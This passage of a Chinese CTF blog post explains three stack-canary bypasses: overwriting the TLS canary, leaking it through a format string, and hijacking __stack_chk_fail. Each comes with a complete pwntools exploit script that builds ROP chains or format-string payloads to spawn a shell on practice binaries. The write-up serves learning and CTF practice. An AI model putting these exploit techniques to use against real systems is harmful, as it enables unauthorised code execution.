class="image-caption">img</span></a><br>以上是libc_start_main关于canary生成的过程，_dl_random是内核提供的随机数生成器<br>fs指向的位置加上0x28偏移处的变量uintptr_t stack_chk_guard就是canary的值</p>
+<h3 id="例题：-CTF2018-babystack"><a href="#例题：-CTF2018-babystack" class="headerlink" title="例题：*CTF2018 babystack"></a>例题：*CTF2018 babystack</h3><p>分析代码<br><a target="_blank" rel="noopener" href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/14.png"><img    class="lazyload" data-original="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/14.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></a><br><a target="_blank" rel="noopener" href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/15.png"><img    class="lazyload" data-original="2021-05-23-canary%E5%90%88%E9%9B%86/15.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></a><br>程序在main函数中创建了一个子线程，并在其中调用栈溢出函数，首先输入size，然后读入size大小的字符<br>在多线程中TLS将被放置在多线程的栈的顶部，因此我们能直接通过栈溢出对canary初始值进行更改</p>
+<h4 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h4><p>断点在main函数，查看canary的地址，只能发现stack和tls结构体中两个canary的值<br><a target="_blank" rel="noopener" href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/16.png"><img    class="lazyload" data-original="2021-05-23-canary%E5%90%88%E9%9B%86/16.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></a><br>再断点到线程函数，搜索canary，会发现tls被初始化了，就是多线程函数在libc上方mmap一段空间用来开辟了一个新的tls结构<br><a target="_blank" rel="noopener" href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/18.png"><img    class="lazyload" data-original="2021-05-23-canary%E5%90%88%E9%9B%86/18.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></a><br><a target="_blank" rel="noopener" href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/17.png"><img    class="lazyload" data-original="2021-05-23-canary%E5%90%88%E9%9B%86/17.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></a><br>并且这个tls结构除了canary其他都没有用，这段空间里面的数据都是随便可写的<br>我们可以gdb.attach给canary前的变量断点，然后continue，如果打通了，说明没有遇到断点，即在子线程中canary之前的变量与需要用到的系统调用无关<br>但是需要注意，在canary之前的那几个变量，在正常程序中与系统调用有关，不能直接改写，一般利用数组越界来跳过他们去改写canary<br>i春秋公益CTF_BFnote这题就是利用数组越界跳过它们去改写canary<br>在内存里大概长这样<br><a target="_blank" rel="noopener" href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/19.png"><img    class="lazyload" data-original="2021-05-23-canary%E5%90%88%E9%9B%86/19.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></a></p>
+<h4 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h4><p>①触发栈溢出，将Canary覆盖为aaaaaaaa，同时使用超长的payload将TLS中的Canary一并覆盖为aaaaaaaa<br>②栈迁移到bss段<br>③ROP</p>
+<h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">from pwn import *<br>p=process(&quot;./bs&quot;)<br>libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)<br>context.terminal = [&#x27;terminator&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]<br><br>pop_rdi_ret = 0x400c03<br>pop_rsi_r15 = 0x400c01<br>read_plt=0x4007e0<br>puts_got=0x601fb0<br>put_plt=0x4007c0<br>buf=0x602f00<br>leave_ret=0x400955<br><br>payload = p64(pop_rdi_ret)+p64(puts_got)+p64(put_plt)<br>payload += p64(pop_rdi_ret)+p64(0)+p64(pop_rsi_r15)+p64(buf+0x8)+p64(0)+p64(read_plt)+p64(leave_ret)<br><br>print p.recvuntil(&quot;How many bytes do you want to send?&quot;)<br>p.sendline(str(6128))<br>p.send(&quot;a&quot;*4112+p64(buf)+payload+&quot;a&quot;*(6128-4120-len(payload)))<br><br>puts_addr = u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))<br>libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]<br>log.success(&quot;puts_addr==&gt;&quot; + hex(puts_addr))<br>log.success(&quot;libc_base==&gt;&quot; + hex(libc_base))<br>system = libc_base+libc.sym[&#x27;system&#x27;]<br>binsh = libc_base+libc.search(&quot;/bin/sh&quot;).next()<br>log.success(&quot;system_addr==&gt;&quot; + hex(system))<br>log.success(&quot;binsh==&gt;&quot; + hex(binsh))<br><br>p.sendline(p64(pop_rdi_ret)+p64(binsh)+p64(system))<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="格式化字符串leak-canary"><a href="#格式化字符串leak-canary" class="headerlink" title="格式化字符串leak canary"></a>格式化字符串leak canary</h2><p>针对有格式化字符串漏洞的栈溢出程序，利用格式化字符串漏洞可以任意地址读写的特点，泄露出栈上的canary，并填入对应位置，然后利用栈溢出get shell<br>这里我找了一个典型的例题，我们需要计算一下偏移，然后利用%p来泄露canary</p>
+<h3 id="例题：ASIS-CTF-Finals-2017-Mary-Morton"><a href="#例题：ASIS-CTF-Finals-2017-Mary-Morton" class="headerlink" title="例题：ASIS-CTF-Finals-2017 Mary_Morton"></a>例题：ASIS-CTF-Finals-2017 Mary_Morton</h3><p>main函数<br><a target="_blank" rel="noopener" href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/20.png"><img    class="lazyload" data-original="2021-05-23-canary%E5%90%88%E9%9B%86/20.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></a><br>有选项可以选<br><a target="_blank" rel="noopener" href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/21.png"><img    class="lazyload" data-original="2021-05-23-canary%E5%90%88%E9%9B%86/21.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></a><br>选项2有格式化字符串漏洞<br><a target="_blank" rel="noopener" href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/22.png"><img    class="lazyload" data-original="2021-05-23-canary%E5%90%88%E9%9B%86/22.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></a><br>选项1有栈溢出漏洞<br><a target="_blank" rel="noopener" href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/23.png"><img    class="lazyload" data-original="2021-05-23-canary%E5%90%88%E9%9B%86/23.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></a><br>还有后门<br><a target="_blank" rel="noopener" href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/24.png"><img    class="lazyload" data-original="2021-05-23-canary%E5%90%88%E9%9B%86/24.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></a><br>开了canary保护<br>意味着要么溢出去触发canary，要么只能利用一次格式化字符串漏洞读内存<br>我们首先确定到可控输入位于格式化字符串第几个参数<br><a target="_blank" rel="noopener" href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/25.png"><img    class="lazyload" data-original="2021-05-23-canary%E5%90%88%E9%9B%86/25.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></a><br>尝试一番可以发现是第6个参数的位置<br><a target="_blank" rel="noopener" href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/26.png"><img    class="lazyload" data-original="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/26.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></a><br>然后计算出buf和canary之间的距离为0x90-0x8=0x88=136<br>这是个64位程序，8字节为一个单位，136/8=17，那么canary距离格式化字符串函数23（17+6）个参数的距离<br>可以利用%23$p来leak canary<br><a target="_blank" rel="noopener" href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/27.png"><img    class="lazyload" data-original="2021-05-23-canary%E5%90%88%E9%9B%86/27.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></a><br>nice<br>接下来就把canary填入rbp-8的位置然后ret2text就彳亍了</p>
+<h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">from pwn import *<br>context.log_level = &#x27;debug&#x27;<br>p = process(&#x27;./Mary_Morton&#x27;)<br>p.recvuntil(&#x27;3. Exit the battle&#x27;)<br>p.sendline(&#x27;2&#x27;)<br>p.sendline(&quot;%23$p&quot;)<br>p.recvuntil(&#x27;0x&#x27;)<br>canary = int(p.recv(16),16)<br>log.success(&quot;canary==&gt;&quot; + hex(canary))<br>system = 0x4008DA<br>payload = &#x27;a&#x27;*0x88 + p64(canary) + p64(0xdeadbeef) + p64(system)<br>p.sendline(&#x27;1&#x27;)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="劫持-stack-chk-fail函数"><a href="#劫持-stack-chk-fail函数" class="headerlink" title="劫持__stack_chk_fail函数"></a>劫持__stack_chk_fail函数</h2><p>改写__stack_chk_fail@got，但前提是必须有一个可以向任意地址写的漏洞，例如说格式化字符串漏洞<br>这个方法适用于只能输入一次的程序，如果说可以利用多次的话就可以像上面一样直接泄露canary了</p>
+<h3 id="例题：-BJDCTF-2nd-r2t4"><a href="#例题：-BJDCTF-2nd-r2t4" class="headerlink" title="例题：[BJDCTF 2nd]r2t4"></a>例题：[BJDCTF 2nd]r2t4</h3><p>程序比较简单，分析下<br><a target="_blank" rel="noopener" href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/28.png"><img    class="lazyload" data-original="2021-05-23-canary%E5%90%88%E9%9B%86/28.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></a><br>存在溢出存在格式化字符串漏洞有canary<br><a target="_blank" rel="noopener" href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/29.png"><img    class="lazyload" data-original="2021-05-23-canary%E5%90%88%E9%9B%86/29.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></a><br>有后门<br>直接改写__stack_chk_fail@got为backdoor<br>这个题限制不多，可以直接用fmtstr_payload模块一把梭<br>当然也可以手动构造<br>但是我还没做手动构造打的（懒🐕</p>
+<h4 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>context.log_level = &#x27;debug&#x27;<br>p=remote(&quot;node3.buuoj.cn&quot;,28676)<br>#p = process(&quot;./r2t4&quot;)<br>elf = ELF(&quot;./r2t4&quot;)<br>libc = elf.libc<br>stack_check = 0x601018<br>flag_addr = 0x400626<br>payload = fmtstr_payload(6,&#123;stack_check:flag_addr&#125;).ljust(40,&#x27;a&#x27;)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>以上就是我对于canary保护的绕过姿势的总结，可能还有我暂时没有涉及到的，也欢迎师傅们提点我一下，这篇博客也算是多天没学习以来的一个新开端吧<br>文中所有的例题和我做分享时的ppt已经上传<a target="_blank" rel="noopener" href="https://github.com/N0vice21/Bypass_canary_demo">github</a></p>
+<p>参考链接：<br><a target="_blank" rel="noopener" href="https://p1kk.github.io/2019/10/26/canary%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/canary/">https://p1kk.github.io/2019/10/26/canary%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/canary/</a><br><a target="_blank" rel="noopener" href="https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/">https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/</a><br><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/mitigation/canary/">https://ctf-wiki.org/pwn/linux/mitigation/canary/</a></p>
+
+      </section>
+      <section class="extra">
+        
+          <ul class="copyright">
+  
+    <li><strong>本文作者：</strong>ShouCheng</li>
+    <li><strong>本文链接：</strong><a href="http://example.com/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/index.html" title="http:&#x2F;&#x2F;example.com&#x2F;2021&#x2F;05&#x2F;23&#x2F;2021-05-23-canary%E5%90%88%E9%9B%86&#x2F;index.html">http:&#x2F;&#x2F;example.com&#x2F;2021&#x2F;05&#x2F;23&#x2F;2021-05-23-canary%E5%90%88%E9%9B%86&#x2F;index.html</a></li>
+    <li><strong>版权声明：</strong>本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" title="BY-NC-SA" target="_blank" rel="noopener">BY-NC-SA</a> 许可协议，转载请注明出处！</li>
+  
+</ul>
+        
+        
+          <section class="donate">
+  <div id="qrcode-donate">
+    <img   class="lazyload" data-original="https://pic.izhaoo.com/alipay.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" >
+  </div>
+  <div class="icon">
+    <a href="javascript:;" id="alipay"><i class="iconfont iconalipay"></i></a>
+    <a href="javascript:;" id="wechat"><i class="iconfont iconwechat-fill"></i></a>
+  </div>
+</section>
+        
+        
+  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/canary/" rel="tag">canary</a></li></ul> 
+
+        
+  <nav class="nav">
+    <a href="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/"><i class="iconfont iconleft"></i>ciscn</a>
+    <a href="/2021/05/22/2021-05-22-%E6%B2%99%E7%AE%B1%E5%85%A5%E9%97%A8%E9%A2%98/">沙箱入门题<i class="iconfont iconright"></i></a>
+  </nav>
+
+      </section>
+      
+    </section>
+  </div>
+</article></div>
+      <div class="col-xl-3">
+        
+          
+  <aside class="toc-wrap">
+    <h3 class="toc-title">文章目录：</h3>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BD%AC%E8%BD%BD%E8%87%AAN%E7%A5%9E%E5%8D%9A%E5%AE%A2"><span class="toc-text">转载自N神博客</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Canary%E4%BB%8B%E7%BB%8D"><span class="toc-text">Canary介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E4%BD%8E%E5%AD%97%E8%8A%82%E6%B3%84%E9%9C%B2Canary"><span class="toc-text">覆盖低字节泄露Canary</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E5%8E%A6%E9%97%A8%E9%82%80%E8%AF%B7%E8%B5%9Bpwn1"><span class="toc-text">例题：攻防世界_厦门邀请赛pwn1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fork%E5%AD%90%E8%BF%9B%E7%A8%8B%E7%A8%8B%E5%BA%8F%E7%88%86%E7%A0%B4canary"><span class="toc-text">Fork子进程程序爆破canary</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSP-Stack-Smashing-Protect-Leak"><span class="toc-text">SSP(Stack Smashing Protect) Leak</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9Awdb2018-guess"><span class="toc-text">例题：wdb2018_guess</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9TLS%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-text">修改TLS结构体</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A-CTF2018-babystack"><span class="toc-text">例题：*CTF2018 babystack</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2leak-canary"><span class="toc-text">格式化字符串leak canary</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9AASIS-CTF-Finals-2017-Mary-Morton"><span class="toc-text">例题：ASIS-CTF-Finals-2017 Mary_Morton</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81-stack-chk-fail%E5%87%BD%E6%95%B0"><span class="toc-text">劫持__stack_chk_fail函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A-BJDCTF-2nd-r2t4"><span class="toc-text">例题：[BJDCTF 2nd]r2t4</span></a></li></ol></li></ol></li></ol>
+  </aside>
+
+        
+      </div>
+    </div>
+  </div>
+</main>
+  
+
+<footer class="footer">
+  <div class="footer-social"><a 
+        href="tencent://message/?Menu=yes&uin=894519210 "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#12B7F5'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconQQ "></i>
+      </a><a 
+        href="javascript:; "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#09BB07'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconwechat-fill "></i>
+      </a><a 
+        href="https://www.instagram.com/izhaoo/ "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#DA2E76'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconinstagram "></i>
+      </a><a 
+        href="https://github.com/zhaoo "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#9f7be1'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  icongithub-fill "></i>
+      </a><a 
+        href="mailto:izhaoo@163.com "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color=#FF3B00" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconmail"></i>
+      </a></div>
+  
+    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+  
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+  
+  
+    
+<script src="/js/color-mode.js"></script>
+
+  
+  
+</body>
+
+<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>
+
+
+
+
+<script src="/js/utils.js"></script>
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+
+  <script>
+    (function () {
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</html>
